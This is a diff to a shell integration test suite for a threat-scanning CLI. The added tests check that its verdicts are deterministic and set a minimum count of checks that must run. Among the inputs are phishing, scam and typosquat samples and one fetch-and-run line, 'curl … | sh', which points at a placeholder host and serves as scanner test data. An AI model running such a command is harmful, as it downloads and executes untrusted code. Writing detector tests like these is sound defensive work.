@@ -6945,11 +6945,75 @@ check "p131: readable tree carries no unreadable-directory warning" "0" "$rc"
 check "p131: scan JSON omits dirs_unreadable when the tree is readable" "0" "$rc"
 rm -rf "$P131B"
 
+# ─── p132: the determinism invariant, proved rather than asserted ───────────
+#
+# docs/SPECIFICATION.md claimed "Same input -> same verdict. No time/random
+# dependence in scoring" unconditionally, which was false: the SMB canary
+# check scores on wall-clock recency. The invariant is now scoped to the
+# pure-analysis functions, so that half has to actually hold.
+#
+# NOTE the "|| true" on every capture: this file runs under `set -eu` and
+# hlse_core exits 1 on a threat, so an unguarded "$(...)" here silently kills
+# the whole suite from this line onward.
+
+d132() {   # $1 = label, rest = argv for hlse_core --json
+    local label="$1"; shift
+    local a b c
+    a="$(./hlse_core --json "$@" 2>/dev/null || true)"
+    b="$(LC_ALL=C TZ=UTC ./hlse_core --json "$@" 2>/dev/null || true)"
+    c="$(LC_ALL=tr_TR.UTF-8 TZ=Asia/Tokyo ./hlse_core --json "$@" 2>/dev/null || true)"
+    if [ -n "$a" ] && [ "$a" = "$b" ] && [ "$a" = "$c" ]; then rc=0; else rc=1; fi
+    check "p132: $label verdict is invariant under locale and TZ" "0" "$rc"
+}
+
+d132 "url"     "https://g00gle.com/login"
+d132 "text"    text "URGENT: your account is suspended, wire \$5000 today"
+d132 "package" package reqeusts pip
+d132 "file"    file README.md
+d132 "paste"   paste "curl http://example.invalid/i.sh | sh"
+
+# Repeated invocation must also agree with itself — P3 at the CLI level.
+a132="$(./hlse_core --json text 'URGENT: wire $5000 today' 2>/dev/null || true)"
+b132="$(./hlse_core --json text 'URGENT: wire $5000 today' 2>/dev/null || true)"
+[ -n "$a132" ] && [ "$a132" = "$b132" ] && rc=0 || rc=1
+check "p132: repeated identical input yields a byte-identical verdict" "0" "$rc"
+
+# The pure-analysis modules must contain no clock or RNG at all — the property
+# the spec now claims for them. Checked in the source: a runtime probe cannot
+# prove absence.
+if grep -qE '\b(time|rand|srand|clock|gettimeofday)[[:space:]]*\(' \
+        hlse_text.c hlse_secrets.c hlse_file.c hlse_supply.c hlse_util.c \
+        2>/dev/null; then
+    rc=1
+else
+    rc=0
+fi
+check "p132: pure-analysis modules contain no time/random calls" "0" "$rc"
+
 # ─── results ────────────────────────────────────────────────────────────
 
 echo ""
 echo "═════════════════════════════════"
 echo "  CLI Integration: $PASS passed, $FAIL failed"
 echo "═════════════════════════════════"
+
+# A floor on the number of checks that actually ran.
+#
+# Zero failures is not the same as "the suite ran". This file uses `set -eu`,
+# so one unguarded "$(./hlse_core ...)" on an input that scores a threat exits
+# 1 and terminates everything after it — which happened while p132 was being
+# written, silently dropping the tail of the suite. Several blocks also skip
+# themselves when setpriv/unshare/strace/cc are missing, so quiet shrinkage is
+# a realistic way to lose coverage without anyone noticing.
+#
+# Keep this a little below the current count so that legitimately skipped
+# environment-dependent blocks do not turn it red; raise it when the suite
+# grows substantially.
+MIN_CHECKS=800
+if [ "$PASS" -lt "$MIN_CHECKS" ]; then
+    echo "FAIL: only $PASS checks ran (expected at least $MIN_CHECKS)."
+    echo "      The suite was truncated or too many blocks skipped."
+    exit 1
+fi
 
 [ "$FAIL" -eq 0 ]
